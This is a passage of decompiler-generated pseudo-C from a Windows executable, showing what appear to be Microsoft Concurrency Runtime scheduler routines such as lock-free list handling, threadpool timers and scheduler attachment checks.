        if ( v16 < *(_DWORD *)(this + 56) )
        {
          *(_DWORD *)(*(_DWORD *)(this + 52) + 4 * v16) = v13;
          ++*(_DWORD *)(this + 60);
        }
        _InterlockedExchange(v11, (__int32)v13);
      }
      if ( *v11 == 1 )
      {
        v20 = 0;
        v21 = sub_46FD09;
        do
          sub_46E3D5((int)v19);
        while ( *v11 == 1 );
      }
    }
    v4 = *(_DWORD *)(v4 + 4);
    v3 = (int)v25;
  }
  while ( !v26 );
  return (int)v25;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 47463E: using guessed type char var_24[8];

//----- (004747A0) --------------------------------------------------------
signed __int32 __thiscall sub_4747A0(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v3; // eax

  v3 = (volatile signed __int32 *)operator new(8u);
  if ( v3 )
    *((_DWORD *)v3 + 1) = a2;
  else
    v3 = 0;
  return sub_4766A8(this + 45, v3);
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004747D1) --------------------------------------------------------
int __thiscall sub_4747D1(int *this, int a2)
{
  int result; // eax

  if ( *this )
  {
    *(_DWORD *)(a2 + 4) = *(_DWORD *)(*this + 4);
    *(_DWORD *)(a2 + 8) = *this;
    *(_DWORD *)(*(_DWORD *)(*this + 4) + 8) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = a2;
  }
  else
  {
    *this = a2;
    *(_DWORD *)(a2 + 8) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = *this;
  }
  return result;
}

//----- (00474805) --------------------------------------------------------
_DWORD *__thiscall sub_474805(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = *(_DWORD **)this;
  if ( *(_DWORD *)this )
  {
    *a2 = *result;
    a2[1] = *(_DWORD *)this;
    *(_DWORD *)(**(_DWORD **)this + 4) = a2;
    result = *(_DWORD **)this;
    **(_DWORD **)this = a2;
  }
  else
  {
    *a2 = a2;
    a2[1] = a2;
  }
  *(_DWORD *)this = a2;
  return result;
}

//----- (00474832) --------------------------------------------------------
void __thiscall sub_474832(volatile signed __int32 *this, _DWORD *a2)
{
  sub_46F085(this + 1);
  sub_474805((void *)this, a2);
  sub_46F19F(this + 1);
}

//----- (00474866) --------------------------------------------------------
unsigned int __thiscall sub_474866(int this, int a2, unsigned int a3)
{
  int v4; // ecx
  unsigned int result; // eax
  int v6; // eax
  int v7; // esi
  char pExceptionObject[12]; // [esp+8h] [ebp-20h] BYREF
  char v9[12]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v10; // [esp+20h] [ebp-8h]
  int (__thiscall ***v11)(_DWORD); // [esp+24h] [ebp-4h]

  v4 = a2;
  if ( !a2 )
  {
    sub_46A08B(v9, (int)"ppVirtualProcessorRoots");
    _CxxThrowException(v9, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a3 )
  {
    sub_46A08B(pExceptionObject, (int)"count");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  result = 0;
  v10 = 0;
  do
  {
    v11 = *(int (__thiscall ****)(_DWORD))(v4 + 4 * result);
    v6 = (**v11)(v11);
    v7 = v6;
    if ( !*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 36) + 4 * v6) + 188) )
      sub_47ED0C(*(volatile __int32 **)(*(_DWORD *)(this + 36) + 4 * v6));
    sub_47D10D(*(volatile signed __int32 ***)(*(_DWORD *)(this + 32) + 4 * v7), (int)v11, 0);
    _InterlockedIncrement((volatile signed __int32 *)(this + 20));
    v4 = a2;
    result = v10 + 1;
    v10 = result;
  }
  while ( result < a3 );
  return result;
}

//----- (0047491E) --------------------------------------------------------
_DWORD *__thiscall sub_47491E(void *this, int a2, _DWORD *a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax

  v4 = operator new(0x138u);
  result = 0;
  if ( v4 )
    return sub_473D9E(v4, (int)this, a2, a3);
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00474959) --------------------------------------------------------
_DWORD *__thiscall sub_474959(void *this, int a2, int a3)
{
  int v4; // esi
  _DWORD *v5; // eax
  int v7[8]; // [esp+10h] [ebp-20h] BYREF

  v4 = 0;
  memset(v7, 0, 16);
  v5 = operator new(0x138u);
  v7[4] = (int)v5;
  v7[7] = 0;
  if ( v5 )
    return sub_473DD6(v5, (int)this, a2, v7);
  return (_DWORD *)v4;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004749A5) --------------------------------------------------------
int __thiscall sub_4749A5(int this)
{
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( sub_47505E() == this )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
  }
  sub_4749EB((volatile signed __int32 *)this, 1);
  return sub_477544(7, 4u, *(_DWORD *)(this + 372));
}
// 47781B: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);

//----- (004749EB) --------------------------------------------------------
_DWORD *__thiscall sub_4749EB(volatile signed __int32 *this, char a2)
{
  volatile signed __int32 **v3; // eax
  int v4; // edi
  _DWORD *v5; // esi
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  v3 = (volatile signed __int32 **)sub_46F930(dword_4F0C08);
  v4 = (int)v3;
  if ( v3 )
  {
    if ( v3[7] == this )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
    }
    if ( !*((_BYTE *)v3 + 76) )
      sub_47E157((int)(v3 - 1));
    sub_477FE0();
  }
  sub_4767EA(this);
  v5 = sub_47563E((union _SLIST_HEADER *)this, a2);
  sub_478493(v5, v4);
  return v5;
}
// 47781B: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00474A5B) --------------------------------------------------------
int __thiscall sub_474A5B(volatile signed __int32 *this)
{
  int result; // eax

  result = _InterlockedCompareExchange(this + 101, -1073741824, 0x80000000);
  if ( result == 0x80000000 )
    return sub_477239(this);
  return result;
}

//----- (00474A7E) --------------------------------------------------------
int __thiscall sub_474A7E(int this)
{
  int result; // eax
  int **i; // ebx

  sub_478772();
  sub_4769BE((union _SLIST_HEADER *)this);
  result = sub_478772();
  for ( i = *(int ***)(this + 180); i; i = (int **)*i )
    result = (*(int (__thiscall **)(int *))(*i[1] + 24))(i[1]);
  return result;
}
// 478772: using guessed type int sub_478772(void);

//----- (00474ABC) --------------------------------------------------------
int __thiscall sub_474ABC(_DWORD *this, ULONG a2)
{
  int v3; // eax
  void *v4; // esi
  __int64 v6; // [esp+4h] [ebp-8h] BYREF

  v3 = sub_471D09();
  v4 = (void *)this[120];
  if ( v3 < 3 )
    return sub_46F4E4(0, v4, a2, 0x7FFFFFFFu);
  v6 = -10000i64 * a2;
  return __crtSetThreadpoolTimer(v4, &v6, 0x7FFFFFFF, 0);
}
// 46BCBF: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 471D09: using guessed type int sub_471D09(void);

//----- (00474B72) --------------------------------------------------------
unsigned int __cdecl sub_474B72(int a1)
{
  unsigned int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 36) + 404) & 0xA0000000;
  if ( result != -1610612736 )
  {
    sub_474F1A(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (00474B7E) --------------------------------------------------------
unsigned int __cdecl sub_474B7E(int a1)
{
  unsigned int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 36) + 404) & 0xA0000000;
  if ( result != -1610612736 )
  {
    sub_474F3B(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (00474B8A) --------------------------------------------------------
int *sub_474B8A()
{
  int *result; // eax

  result = (int *)_InterlockedDecrement(&dword_4E81A4);
  if ( result == (int *)0x80000000 )
  {
    sub_4763A0();
    result = &dword_4E81A4;
    _InterlockedAnd(&dword_4E81A4, 0x7FFFFFFFu);
  }
  return result;
}
// 4E81A4: using guessed type int dword_4E81A4;

//----- (00474BB0) --------------------------------------------------------
int *sub_474BB0()
{
  int *result; // eax

  sub_46FC8F(&dword_4F0C1C);
  result = (int *)(dword_4F0C10 + 1);
  dword_4F0C10 = (int)result;
  if ( result == (int *)1 )
  {
    if ( !dword_4F0C68 )
      result = (int *)sub_47C130();
    if ( dword_4E81A4 >= 0 )
    {
      sub_47638C();
      result = &dword_4E81A4;
      _InterlockedOr(&dword_4E81A4, 0x80000000);
    }
  }
  dword_4F0C1C = 0;
  return result;
}
// 4E81A4: using guessed type int dword_4E81A4;
// 4F0C10: using guessed type int dword_4F0C10;
// 4F0C1C: using guessed type int dword_4F0C1C;
// 4F0C68: using guessed type int dword_4F0C68;

//----- (00474C15) --------------------------------------------------------
int __thiscall sub_474C15(int this)
{
  int v2; // esi
  int v3; // eax
  int v4; // eax
  void *v5; // ebx
  int v6; // esi
  int v7; // eax
  void *v8; // ebx
  char *v9; // ecx

  v2 = 0;
  v3 = *(_DWORD *)(this + 44);
  if ( v3 > 0 )
  {
    do
    {
      v4 = *(_DWORD *)(this + 32);
      v5 = *(void **)(v4 + 4 * v2);
      if ( v5 )
      {
        sub_47CF82(*(_DWORD *)(v4 + 4 * v2));
        sub_46C87D(v5);
      }
      v3 = *(_DWORD *)(this + 44);
      ++v2;
    }
    while ( v2 < v3 );
  }
  v6 = 0;
  if ( v3 > 0 )
  {
    do
    {
      v7 = *(_DWORD *)(this + 36);
      v8 = *(void **)(v7 + 4 * v6);
      if ( v8 )
      {
        sub_47ECF4(*(union _SLIST_HEADER **)(v7 + 4 * v6));
        sub_46C87D(v8);
      }
      ++v6;
    }
    while ( v6 < *(_DWORD *)(this + 44) );
  }
  j_j_j___free_base(*(void **)(this + 92));
  j_j_j___free_base(*(void **)(this + 32));
  j_j_j___free_base(*(void **)(this + 36));
  v9 = *(char **)(this + 28);
  if ( v9 )
    sub_474441(v9, 3);
  sub_46F922(*(_DWORD *)(this + 24));
  *(_DWORD *)(this + 24) = 0;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 424) + 4))(*(_DWORD *)(this + 424));
  return sub_4770A7();
}

//----- (00474CC8) --------------------------------------------------------
int __thiscall sub_474CC8(_DWORD *this)
{
  volatile __int32 *v2; // ebx
  unsigned int i; // eax
  unsigned int v4; // esi
  int result; // eax

  v2 = this + 81;
  sub_46FC7F(this + 81);
  for ( i = sub_477619(this); ; i = sub_4775D1(this, v4) )
  {
    v4 = i;
    result = sub_46FCC0(v2);
    if ( !v4 )
      break;
    sub_474D0B(this, v4);
    sub_46FC7F(v2);
  }
  return result;
}

//----- (00474D0B) --------------------------------------------------------
int __thiscall sub_474D0B(int *this, unsigned int a2)
{
  _DWORD *v3; // ebx
  int v4; // eax
  unsigned int v5; // eax
  int v6; // eax
  int v7; // esi
  int result; // eax
  int v9; // eax
  int v10; // [esp+Ch] [ebp-Ch] BYREF
  int *v11; // [esp+10h] [ebp-8h]
  _DWORD *v12; // [esp+14h] [ebp-4h]

  v10 = 0;
  v11 = &v10;
  v3 = this + 81;
  v12 = this + 81;
  sub_46FC7F(this + 81);
  v4 = this[79];
  if ( v4 )
  {
    do
    {
      if ( a2 )
      {
        v5 = *(_DWORD *)(v4 + 8);
        if ( v5 < this[85] || v5 > a2 )
          break;
      }
      v6 = sub_474F76(this + 79);
      v7 = v6 + 12;
      *(_DWORD *)(v6 + 12) = 0;
      *v11 = v6;
      v4 = this[79];
      v11 = (int *)v7;
    }
    while ( v4 );
    v3 = v12;
  }
  result = sub_46FCC0(v3);
  while ( v10 )
  {
    v9 = sub_474F76(&v10);
    result = (*(int (__cdecl **)(_DWORD))v9)(*(_DWORD *)(v9 + 4));
  }
  return result;
}

//----- (00474DA2) --------------------------------------------------------
unsigned int __thiscall sub_474DA2(_DWORD *this)
{
  int v2; // esi
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  _DWORD *v6; // eax
  int v7; // eax
  unsigned int v8; // eax
  int v10; // [esp+Ch] [ebp-10h]
  int v11; // [esp+10h] [ebp-Ch]
  int v12; // [esp+14h] [ebp-8h]
  char v13; // [esp+1Bh] [ebp-1h]

  v13 = 0;
  v2 = 0;
  v3 = 0;
  v11 = 0;
  if ( (int)this[11] > 0 )
  {
    while ( 1 )
    {
      v4 = *(_DWORD *)(this[8] + 4 * v2);
      v10 = v4;
      if ( v4 )
      {
        v5 = 0;
        v12 = 0;
        if ( *(int *)(v4 + 120) > 0 )
          break;
      }
LABEL_15:
      v11 = ++v2;
      if ( v2 >= this[11] )
        return v3;
    }
    v6 = (_DWORD *)(v4 + 56);
    while ( 1 )
    {
      v7 = sub_4743F9(v6, v5);
      if ( v7 )
      {
        v8 = *(_DWORD *)(v7 + 192);
        if ( v8 < this[85] )
          v8 = -1;
        if ( !v13 )
        {
          v13 = 1;
LABEL_12:
          v3 = v8;
          goto LABEL_13;
        }
        if ( v3 > v8 )
          goto LABEL_12;
      }
LABEL_13:
      v6 = (_DWORD *)(v10 + 56);
      v5 = v12 + 1;
      v12 = v5;
      if ( v5 >= *(_DWORD *)(v10 + 120) )
      {
        v2 = v11;
        goto LABEL_15;
      }
    }
  }
  return v3;
}

//----- (00474E2B) --------------------------------------------------------
int __thiscall sub_474E2B(int this, int a2)
{
  void *v3; // edx
  int result; // eax
  unsigned int v5; // edi
  unsigned int v6; // edx

  v3 = *(void **)this;
  if ( *(_DWORD *)this != *(_DWORD *)a2 )
  {
    result = sub_476733((void **)this, *(void **)a2);
    v3 = *(void **)this;
  }
  v5 = 0;
  v6 = ((unsigned int)v3 + 31) >> 5;
  if ( v6 )
  {
    do
    {
      result = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v5);
      *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v5++) = result;
    }
    while ( v5 < v6 );
  }
  return result;
}

//----- (00474E69) --------------------------------------------------------
_DWORD *sub_474E69()
{
  volatile signed __int32 *v0; // ebx
  _DWORD *v1; // edi

  v0 = (volatile signed __int32 *)sub_4755A1();
  v1 = sub_4749EB(v0, 0);
  (*(void (__thiscall **)(volatile signed __int32 *))(*v0 + 20))(v0);
  return v1;
}

//----- (00474E95) --------------------------------------------------------
int *__thiscall sub_474E95(int this, _DWORD *a2)
{
  return sub_476093(this, a2);
}

//----- (00474E9E) --------------------------------------------------------
int *__thiscall sub_474E9E(void *this)
{
  int v2[4]; // [esp+0h] [ebp-10h] BYREF

  memset(v2, 0, sizeof(v2));
  return sub_476093((int)this, v2);
}

//----- (00474EBD) --------------------------------------------------------
HANDLE *__cdecl sub_474EBD(int *a1)
{
  HANDLE *v1; // eax

  sub_479D85(a1);
  sub_474BB0();
  v1 = sub_480A22((const void **)a1);
  if ( v1 )
    return v1 + 2;
  else
    return 0;
}

//----- (00474EE3) --------------------------------------------------------
int __thiscall sub_474EE3(int this)
{
  int result; // eax

  result = _InterlockedDecrement((volatile signed __int32 *)(this + 392));
  if ( !result )
    return sub_475095((_DWORD **)this);
  return result;
}

//----- (00474EFC) --------------------------------------------------------
signed __int32 __thiscall sub_474EFC(int this)
{
  signed __int32 result; // eax

  result = _InterlockedIncrement((volatile signed __int32 *)(this + 484));
  if ( result == 1 )
    return SetEvent(*(HANDLE *)(this + 472));
  return result;
}

//----- (00474F1A) --------------------------------------------------------
void __stdcall sub_474F1A(_DWORD *a1)
{
  _DWORD *v2; // eax

  while ( a1 )
  {
    v2 = a1 - 1;
    a1 = (_DWORD *)*a1;
    sub_46C87D(v2);
  }
}

//----- (00474F3B) --------------------------------------------------------
int __stdcall sub_474F3B(_DWORD *a1)
{
  int v2; // eax
  int result; // eax

  while ( a1 )
  {
    v2 = (int)(a1 - 13);
    a1 = (_DWORD *)*a1;
    result = sub_473C46(v2);
  }
  return result;
}

//----- (00474F59) --------------------------------------------------------
int __thiscall sub_474F59(int *this)
{
  int v2; // edx
  int v4; // ecx

  v2 = *this;
  if ( !*this )
    return 0;
  v4 = *(_DWORD *)(v2 + 232);
  *this = v4;
  if ( !v4 )
    this[1] = (int)this;
  return v2;
}

//----- (00474F76) --------------------------------------------------------
int __thiscall sub_474F76(int *this)
{
  int v2; // edx
  int v4; // ecx

  v2 = *this;
  if ( !*this )
    return 0;
  v4 = *(_DWORD *)(v2 + 12);
  *this = v4;
  if ( !v4 )
    this[1] = (int)this;
  return v2;
}

//----- (00474F90) --------------------------------------------------------
int __thiscall sub_474F90(int *this)
{
  _DWORD *v2; // esi
  int v3; // edi

  v2 = this + 2;
  sub_46FC7F(this + 2);
  v3 = sub_474F59(this);
  sub_46FCC0(v2);
  return v3;
}

//----- (00474FC4) --------------------------------------------------------
int __thiscall sub_474FC4(HANDLE *this)
{
  UnregisterWaitEx(this[119], (HANDLE)0xFFFFFFFF);
  if ( sub_471D09() < 3 )
    sub_46F594(0, this[120], (HANDLE)0xFFFFFFFF);
  else
    sub_46F9F0((int)this[120]);
  CloseHandle(this[118]);
  return sub_474EE3((int)this);
}
// 471D09: using guessed type int sub_471D09(void);

//----- (0047500F) --------------------------------------------------------
int __thiscall sub_47500F(volatile signed __int32 *this, struct _SINGLE_LIST_ENTRY *a2, char a3)
{
  _BYTE *v3; // esi
  int result; // eax

  v3 = 0;
  if ( a3 )
    v3 = sub_478475(a2);
  sub_4768C3((int)this, a2);
  result = sub_476905(this);
  if ( v3 )
  {
    if ( !v3[76] )
      return sub_47E3F6(v3 - 4);
  }
  return result;
}

//----- (00475051) --------------------------------------------------------
LPVOID sub_475051()
{
  return sub_46F930(dword_4F0C08);
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (0047505E) --------------------------------------------------------
int sub_47505E()
{
  _DWORD *v0; // eax

  v0 = sub_46F930(dword_4F0C08);
  if ( v0 )
    return sub_406D70(v0);
  else
    return 0;
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00475078) --------------------------------------------------------
int __thiscall sub_475078(_DWORD *this)
{
  unsigned int v1; // edx
  unsigned int i; // esi
  int result; // eax

  v1 = (unsigned int)(*this + 31) >> 5;
  for ( i = 0; i < v1; ++i )
  {
    result = this[1];
    *(_DWORD *)(result + 4 * i) = -1;
  }
  return result;
}

//----- (00475095) --------------------------------------------------------
int __thiscall sub_475095(_DWORD **this)
{
  _DWORD **v1; // ebx
  _DWORD *v2; // edi
  _DWORD *v3; // esi
  PSLIST_ENTRY v4; // eax
  int i; // edx
  int v6; // esi
  PSLIST_ENTRY v7; // eax
  int v8; // ebx
  int v9; // edi
  HANDLE *v10; // esi

  v1 = this;
  (*(void (__thiscall **)(_DWORD *))(*this[107] + 4))(this[107]);
  CloseHandle(v1[95]);
  v2 = (_DWORD *)_InterlockedExchange((volatile __int32 *)v1 + 45, 0);
  if ( v2 )
  {
    do
    {
      v3 = (_DWORD *)*v2;
      sub_473C21(v2[1]);
      sub_46C87D(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v4 = InterlockedFlushSList((PSLIST_HEADER)v1 + 62);
  for ( i = v4 != 0 ? (unsigned int)&v4[-1] : 0; i; i = v6 != 0 ? v6 - 4 : 0 )
  {
    v6 = *(_DWORD *)(i + 4);
    sub_473BFE(i);
  }
  v7 = InterlockedFlushSList((PSLIST_HEADER)v1 + 63);
  if ( (v7 != 0 ? (unsigned int)&v7[-3] : 0) != 0 )
  {
    v8 = v7 != 0 ? (unsigned int)&v7[-3] : 0;
    do
    {
      v9 = *(_DWORD *)(v8 + 12) != 0 ? *(_DWORD *)(v8 + 12) - 12 : 0;
      (**(void (__thiscall ***)(int, int))v8)(v8, 1);
      v8 = v9;
    }
    while ( v9 );
    v1 = this;
  }
  sub_477544(2, 4u, (int)v1[93]);
  while ( v1[46] )
  {
    v10 = (HANDLE *)sub_476CB6((int)(v1 + 46));
    SetEvent(v10[2]);
    CloseHandle(v10[2]);
    sub_46C87D(v10);
  }
  return ((int (__thiscall *)(_DWORD **, int))**v1)(v1, 1);
}

//----- (004751BF) --------------------------------------------------------
_DWORD *__thiscall sub_4751BF(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD *result; // eax

  v4 = sub_475B3F((int)a2, *this);
  result = sub_47629F(this, a2, v4);
  if ( !result )
    return 0;
  if ( a3 )
    *a3 = result[2];
  return result;
}

//----- (004751F5) --------------------------------------------------------
int __thiscall sub_4751F5(void *this)
{
  int v2; // edi
  void **v3; // eax
  void **v4; // esi

  v2 = 0;
  v3 = (void **)sub_46F930(dword_4F0C08);
  v4 = v3;
  if ( v3 && v3[7] == this && !*((_BYTE *)v3 + 76) )
  {
    UserMathErrorFunction();
    v2 = *((_DWORD *)v4[39] + 20);
    UserMathErrorFunction();
  }
  return v2;
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00475236) --------------------------------------------------------
int __thiscall sub_475236(unsigned int *this, _DWORD *a2)
{
  int v3; // esi
  int v5; // [esp+8h] [ebp-8h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v3 = 0;
  if ( (*a2 & 0xFFFFFFF) == 2 )
    return *(_DWORD *)(this[8] + 4 * a2[2]);
  if ( (*a2 & 0xFFFFFFF) == 3 )
  {
    v6 = a2[2];
    if ( sub_4751BF(this + 87, &v6, &v5) )
      return *(_DWORD *)(this[8] + 4 * v5);
  }
  return v3;
}

//----- (0047528F) --------------------------------------------------------
int __stdcall sub_47528F(int a1, int a2, _DWORD *a3, _DWORD *a4)
{
  int result; // eax

  for ( result = 0; a1 < a2 && !result; result = sub_4743F9(a4, a1++) )
    ;
  *a3 = a1 - 1;
  return result;
}

//----- (004752BA) --------------------------------------------------------
int __thiscall sub_4752BA(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  for ( result = 0; a2 < a3 && !result; result = sub_4743F9(this + 14, a2++) )
    ;
  *a4 = a2 - 1;
  return result;
}

//----- (004752E9) --------------------------------------------------------
char __thiscall sub_4752E9(unsigned int *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7)
{
  char v7; // bl
  _DWORD *v9; // esi
  int v10; // esi
  int v11; // eax
  unsigned int v12; // eax
  _DWORD *v13; // esi
  int v14; // esi
  _DWORD *v15; // ecx
  int v17; // [esp-14h] [ebp-2Ch] BYREF
  int v18; // [esp-10h] [ebp-28h]
  int v19; // [esp-Ch] [ebp-24h]
  int v20; // [esp-8h] [ebp-20h]
  int v21; // [esp-4h] [ebp-1Ch]
  int v22; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  v7 = 1;
  if ( (a3 & 0xFFFFFFF) == 1 )
  {
    v10 = 0;
    v11 = this[7] + 16 * a5;
    v22 = v11;
    for ( i = 0; v10 < (int)this[11]; i = v10 )
    {
      if ( ((1 << (v10 & 0x1F)) & *(_DWORD *)(*(_DWORD *)(v11 + 4) + 4 * ((unsigned int)v10 >> 5))) != 0 )
      {
        v12 = this[8];
        v21 = a7;
        v13 = *(_DWORD **)(v12 + 4 * v10);
        sub_4777A9(&v17, &a3);
        if ( sub_47D300(v13, a2, v17, v18, v19, v20, v21) )
          return v7;
        v10 = i;
      }
      v11 = v22;
      ++v10;
    }
  }
  else if ( (a3 & 0xFFFFFFFu) - 2 <= 1 )
  {
    v9 = (_DWORD *)sub_475236(this, &a3);
    if ( v9 )
    {
      v21 = a7;
      sub_4777A9(&v17, &a3);
      if ( sub_47D300(v9, a2, v17, v18, v19, v20, v21) )
        return v7;
    }
  }
  v14 = 0;
  if ( (int)this[11] <= 0 )
    return 0;
  while ( 1 )
  {
    v15 = *(_DWORD **)(this[8] + 4 * v14);
    if ( v15 )
    {
      if ( (int)v15[7] > 0 && sub_47D300(v15, a2, 0, 0, 0, 0, a7) )
        break;
    }
    if ( ++v14 >= (int)this[11] )
      return 0;
  }
  return v7;
}

//----- (004753F1) --------------------------------------------------------
char __thiscall sub_4753F1(_DWORD *this)
{
  _DWORD *v1; // ecx
  char v2; // dl

  v1 = (_DWORD *)this[45];
  v2 = 0;
  while ( v1 )
  {
    if ( !*(_BYTE *)(v1[1] + 236) && *(_DWORD *)(v1[1] + 44) )
      return 1;
    v1 = (_DWORD *)*v1;
  }
  return v2;
}

//----- (0047541B) --------------------------------------------------------
char __thiscall sub_47541B(_DWORD *this)
{
  int v2; // ecx
  char v3; // bl
  _DWORD *v4; // esi
  int v5; // edi
  _DWORD *v6; // eax
  int v7; // edi
  _DWORD *v8; // eax
  _DWORD *v10; // [esp+4h] [ebp-Ch]
  void *v11; // [esp+8h] [ebp-8h]
  void *v12; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v10 = this;
  for ( i = 0; v2 < v10[11]; i = ++v2 )
  {
    v4 = *(_DWORD **)(this[9] + 4 * v2);
    if ( v4 )
    {
      v5 = 0;
      if ( (int)v4[20] > 0 )
      {
        while ( 1 )
        {
          v6 = (_DWORD *)sub_4743F9(v4 + 4, v5);
          v11 = v6;
          if ( v6 )
          {
            if ( sub_47FA7F(v6) || sub_47FA87(v11) )
              break;
          }
          if ( ++v5 >= v4[20] )
            goto LABEL_10;
        }
        v3 = 1;
LABEL_10:
        v2 = i;
      }
      if ( v3 )
        return v3;
      v7 = 0;
      if ( (int)v4[40] > 0 )
      {
        while ( 1 )
        {
          v8 = (_DWORD *)sub_4743F9(v4 + 24, v7);
          v12 = v8;
          if ( v8 )
          {
            if ( sub_47FA7F(v8) || sub_47FA87(v12) )
              break;
          }
          if ( ++v7 >= v4[40] )
            goto LABEL_19;
        }
        v3 = 1;
LABEL_19:
        v2 = i;
      }
    }
    this = v10;
  }
  return v3;
}

//----- (004754E2) --------------------------------------------------------
int __thiscall sub_4754E2(_DWORD *this)
{
  return *(_DWORD *)(sub_475884(this) + 8);
}

//----- (004754EB) --------------------------------------------------------
_DWORD *__thiscall sub_4754EB(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  unsigned int v10; // [esp+10h] [ebp-18h] BYREF
  int v11[5]; // [esp+14h] [ebp-14h] BYREF

  v4 = sub_471D0E();
  sub_473E26(a2, v4);
  v11[4] = 0;
  v11[1] = 1;
  v5 = *a3 & 0xFFFFFFF;
  if ( !v5 )
  {
    sub_475078(a2);
    return a2;
  }
  v6 = v5 - 1;
  if ( !v6 )
  {
    v8 = 16 * a3[2] + 8 + this[7];
    goto LABEL_8;
  }
  v7 = v6 - 1;
  if ( !v7 )
  {
    v8 = *(_DWORD *)(this[8] + 4 * a3[2]) + 8;
LABEL_8:
    sub_474E2B((int)a2, v8);
    return a2;
  }
  if ( v7 == 1 )
  {
    v11[0] = a3[2];
    sub_4751BF(this + 90, v11, &v10);
    *(_DWORD *)(a2[1] + 4 * (v10 >> 5)) |= 1 << (v10 & 0x1F);
  }
  return a2;
}

//----- (004755A1) --------------------------------------------------------
int sub_4755A1()
{
  int result; // eax
  char v1; // [esp+0h] [ebp-24h]
  void *v2[3]; // [esp+14h] [ebp-10h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  sub_46FC8F(&dword_4F0C24);
  v3 = 0;
  if ( !dword_4F0C00 || !sub_476EEC((volatile signed __int32 *)dword_4F0C00) )
  {
    sub_479A46((unsigned int *)v2, 0, v1);
    LOBYTE(v3) = 1;
    if ( dword_4F0C04 )
      sub_479AE7(v2, (const void **)dword_4F0C04);
    dword_4F0C00 = (int)sub_474EBD((int *)v2);
    sub_475B72((_DWORD *)dword_4F0C00);
    (*(void (__thiscall **)(int))(*(_DWORD *)dword_4F0C00 + 16))(dword_4F0C00);
    sub_479ADB(v2);
  }
  result = dword_4F0C00;
  dword_4F0C24 = 0;
  return result;
}
// 4755D7: variable 'v1' is possibly undefined
// 4F0C00: using guessed type int dword_4F0C00;
// 4F0C04: using guessed type int dword_4F0C04;
// 4F0C24: using guessed type int dword_4F0C24;

//----- (0047563E) --------------------------------------------------------
_DWORD *__thiscall sub_47563E(union _SLIST_HEADER *this, char a2)
{
  PSLIST_ENTRY v3; // eax
  int v4; // esi
  _DWORD *v5; // eax

  v3 = InterlockedPopEntrySList(this + 62);
  v4 = v3 != 0 ? (unsigned int)&v3[-1] : 0;
  if ( v4 )
  {
    sub_480796(v4, a2);
  }
  else
  {
    v5 = operator new(0xB0u);
    if ( v5 )
      return sub_48050C(v5, (int)this, a2);
  }
  return (_DWORD *)v4;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047569E) --------------------------------------------------------
int __thiscall sub_47569E(int this, char a2)
{
  char v3; // bl
  int result; // eax
  unsigned int v5; // esi
  PSLIST_ENTRY v6; // eax
  _DWORD *v7; // ebx

  v3 = a2;
  if ( a2 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 88))(this) )
    {
      result = sub_47596F((union _SLIST_HEADER *)this);
      if ( result )
        return result;
    }
    v5 = sub_477442((_DWORD *)this, 1);
    if ( v5 )
    {
      if ( (unsigned int)j____crtGetTickCount64() - *(_DWORD *)(this + 464) < v5 )
        return 0;
      v3 = 0;
    }
  }
  _InterlockedIncrement((volatile signed __int32 *)(this + 400));
